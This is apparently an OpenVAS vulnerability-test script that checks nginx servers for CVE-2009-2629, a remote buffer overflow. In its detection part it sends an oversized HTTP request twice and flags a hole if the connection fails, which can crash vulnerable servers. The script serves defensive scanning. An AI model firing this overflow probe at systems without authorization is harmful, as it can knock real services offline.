###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nginx_http_request_bof_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# nginx HTTP Request Remote Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary code
  within the context of the affected application. Failed exploit attempts
  will result in a denial-of-service condition.
  Impact Level: Application";
tag_affected = "nginx versions 0.1.0 through 0.5.37, 0.6.x before 0.6.39, 0.7.x before 0.7.62,
  and 0.8.x before 0.8.15.";
tag_insight = "The flaw is due to an error in 'src/http/ngx_http_parse.c' which
  allows remote attackers to execute arbitrary code via crafted HTTP requests.";
tag_solution = "Upgrade to nginx versions 0.5.38, 0.6.39, 0.7.62 or 0.8.15,
  For updates refer to http://nginx.org/en/download.html";
tag_summary = "This host is running nginx and is prone to buffer-overflow
  vulnerability.";

if(description)
{
  script_id(801636);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-11-18 06:30:08 +0100 (Thu, 18 Nov 2010)");
  script_cve_id("CVE-2009-2629");
  script_bugtraq_id(36384);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("nginx HTTP Request Remote Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/180065");
  script_xref(name : "URL" , value : "http://sysoev.ru/nginx/patch.180065.txt");

  script_description(desc);
  script_summary("Check if nginx is vulnerable to Buffer Overflow");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("http_version.nasl","nginx_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("nginx/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get Banner
banner = get_http_banner(port: port);
if(!banner) {
  exit(0);
}

## Confirm the application
if("Server: nginx/" >< banner)
{
  ## Construct Attack Request
  req = http_get(item: crap(4079), port:port);

  ## Open Socket
  soc = http_open_socket(port);
  if(!soc) {
    exit(0);
  }

  ## Sending Attack
  for(i=0; i<2; i++)
  {
    snd = send(socket: soc, data: req);
    sleep(2);
    
    ## Check Socket status
    if(snd < 0)
    {
      security_hole(port);
      exit(0);
    }
  }
  http_close_socket(soc);
}
